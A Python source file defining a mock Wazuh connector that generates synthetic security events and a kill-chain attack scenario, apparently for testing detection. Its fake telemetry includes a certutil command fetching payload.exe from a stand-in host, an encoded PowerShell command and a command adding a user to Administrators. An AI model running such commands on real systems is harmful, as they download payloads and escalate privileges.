from ai_service.connectors.models.event import SecurityEvent
from typing import List
from datetime import datetime, timedelta
import random
import logging

logger = logging.getLogger(__name__)

class MockWazuhConnector:
    """
    Mock Wazuh connector that generates realistic security events
    without requiring actual Wazuh connection
    """
    
    def __init__(self):
        self.users = ["admin", "user1", "user2", "service_account", "developer"]
        self.hostnames = ["WORKSTATION-01", "WORKSTATION-02", "SERVER-01", "SERVER-02", "LAPTOP-03"]
        self.internal_ips = ["192.168.1.50", "192.168.1.51", "192.168.1.100", "192.168.1.101", "192.168.1.200"]
        self.external_ips = ["8.8.8.8", "1.1.1.1", "208.67.222.222", "203.0.113.45", "198.51.100.50"]
        
        self.processes = [
            ("explorer.exe", "C:\\Windows\\explorer.exe"),
            ("cmd.exe", "C:\\Windows\\System32\\cmd.exe"),
            ("powershell.exe", "C:\\Windows\\System32\\powershell.exe"),
            ("notepad.exe", "C:\\Windows\\notepad.exe"),
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe"),
            ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
            ("python.exe", "C:\\Python\\python.exe"),
        ]
        
        self.sensitive_files = [
            "C:\\Data\\Financial\\reports.xlsx",
            "C:\\Data\\HR\\salaries.xlsx",
            "C:\\Confidential\\secrets.txt",
            "C:\\Users\\admin\\Documents\\passwords.txt",
            "\\\\server\\Finance\\Q4_Budget.xlsx",
        ]
    
    def generate_event(self, event_type: str = None) -> SecurityEvent:
        """Generate a single mock security event"""
        
        event_types = [
            "login", "process_execution", "file_access", 
            "network_connection", "privilege_escalation",
            "service_installation", "registry_modification",
            "dns_query", "port_scan", "lateral_movement"
        ]
        
        if event_type is None:
            event_type = random.choice(event_types)
        
        now = datetime.utcnow()
        
        # Base event
        event = SecurityEvent(
            timestamp=now - timedelta(minutes=random.randint(0, 60)),
            source_ip=random.choice(self.internal_ips),
            destination_ip=random.choice(self.internal_ips + self.external_ips),
            source_port=random.randint(49152, 65535),
            destination_port=random.choice([80, 443, 22, 3389, 445, 53, 123]),
            
            event_type=event_type,
            user=random.choice(self.users),
            hostname=random.choice(self.hostnames),
            
            rule_id=random.randint(1000, 9999),
            severity=self._assign_severity(event_type),
        )
        
        # Type-specific details
        if event_type == "process_execution":
            proc_name, proc_path = random.choice(self.processes)
            event.process_name = proc_name
            event.process_id = random.randint(100, 10000)
            event.parent_process = "explorer.exe" if random.random() > 0.3 else "cmd.exe"
            event.command_line = f"{proc_path} {self._random_args(proc_name)}"
            event.rule_description = f"Process execution: {proc_name}"
        
        elif event_type == "file_access":
            event.file_path = random.choice(self.sensitive_files)
            event.file_hash = self._random_hash()
            event.rule_description = f"Sensitive file accessed: {event.file_path}"
        
        elif event_type == "login":
            event.rule_description = f"User login: {event.user}@{event.hostname}"
        
        elif event_type == "privilege_escalation":
            event.process_name = "powershell.exe"
            event.command_line = "powershell.exe -Command Add-LocalGroupMember -Group Administrators"
            event.severity = "high"
            event.rule_description = "Possible privilege escalation detected"
        
        elif event_type == "port_scan":
            event.rule_description = f"Port scan detected from {event.source_ip}"
            event.severity = "medium"
        
        elif event_type == "lateral_movement":
            event.rule_description = f"Lateral movement detected: {event.source_ip} -> {event.destination_ip}"
            event.process_name = "psexec.exe"
            event.severity = "high"
        
        elif event_type == "dns_query":
            event.rule_description = f"DNS query to suspicious domain"
            event.metadata = {"query": "suspicious-domain.com"}
        
        return event
    
    def generate_events(self, count: int = 100, event_types: List[str] = None) -> List[SecurityEvent]:
        """Generate multiple security events"""
        events = []
        for _ in range(count):
            event_type = random.choice(event_types) if event_types else None
            events.append(self.generate_event(event_type))
        
        logger.info(f"Generated {count} mock security events")
        return events
    
    def generate_attack_scenario(self) -> List[SecurityEvent]:
        """
        Generate a realistic attack scenario following the kill chain:
        Reconnaissance -> Exploitation -> Persistence -> Lateral Movement -> Exfiltration
        """
        base_time = datetime.utcnow()
        attacker_ip = "192.168.1.50"  # Compromised internal IP
        events = []
        
        # 1. Reconnaissance (port scanning)
        for i in range(3):
            events.append(SecurityEvent(
                timestamp=base_time + timedelta(minutes=i),
                source_ip=attacker_ip,
                destination_ip=random.choice(self.internal_ips),
                event_type="port_scan",
                hostname="WORKSTATION-01",
                rule_description="Port scan detected",
                severity="medium",
                metadata={"ports_scanned": [80, 443, 22, 3389]}
            ))
        
        # 2. Exploitation (privilege escalation)
        events.append(SecurityEvent(
            timestamp=base_time + timedelta(minutes=5),
            source_ip=attacker_ip,
            user="user1",
            hostname="WORKSTATION-01",
            event_type="privilege_escalation",
            process_name="powershell.exe",
            command_line="powershell.exe -enc VwByAGkAdABlAC0AQQBuAGEAYgBvA...",
            rule_description="Privilege escalation attempt",
            severity="high"
        ))
        
        # 3. Persistence (scheduled task)
        events.append(SecurityEvent(
            timestamp=base_time + timedelta(minutes=10),
            source_ip=attacker_ip,
            user="admin",
            hostname="WORKSTATION-01",
            event_type="service_installation",
            rule_description="Suspicious scheduled task created",
            severity="high",
            metadata={"task_name": "Windows Update Check"}
        ))
        
        # 4. Lateral Movement
        events.append(SecurityEvent(
            timestamp=base_time + timedelta(minutes=15),
            source_ip=attacker_ip,
            destination_ip="192.168.1.100",
            user="admin",
            hostname="SERVER-01",
            event_type="lateral_movement",
            process_name="psexec.exe",
            rule_description="Lateral movement detected",
            severity="high"
        ))
        
        # 5. Exfiltration (large data transfer)
        events.append(SecurityEvent(
            timestamp=base_time + timedelta(minutes=20),
            source_ip="192.168.1.100",
            destination_ip=random.choice(self.external_ips),
            user="service_account",
            hostname="SERVER-01",
            event_type="file_access",
            file_path="C:\\Data\\Financial\\reports.xlsx",
            rule_description="Large data transfer to external IP",
            severity="critical",
            metadata={"bytes_transferred": 1073741824}  # 1GB
        ))
        
        logger.info(f"Generated realistic attack scenario with {len(events)} events")
        return events
    
    @staticmethod
    def _assign_severity(event_type: str) -> str:
        """Assign severity based on event type"""
        severity_map = {
            "port_scan": "medium",
            "privilege_escalation": "high",
            "lateral_movement": "high",
            "file_access": "low",
            "login": "low",
            "process_execution": "medium",
        }
        return severity_map.get(event_type, "low")
    
    @staticmethod
    def _random_args(process_name: str) -> str:
        """Generate random command-line arguments"""
        args = {
            "powershell.exe": "-Command Get-Process | Where-Object {$_.CPU -gt 100}",
            "cmd.exe": "/c dir C:\\",
            "certutil.exe": "-urlcache -f http://suspicious.com/payload.exe",
            "svchost.exe": "-k LocalService",
        }
        return args.get(process_name, "")
    
    @staticmethod
    def _random_hash() -> str:
        """Generate a random file hash"""
        return ''.join(random.choices('0123456789abcdef', k=64))

# Singleton instance
mock_wazuh = MockWazuhConnector()
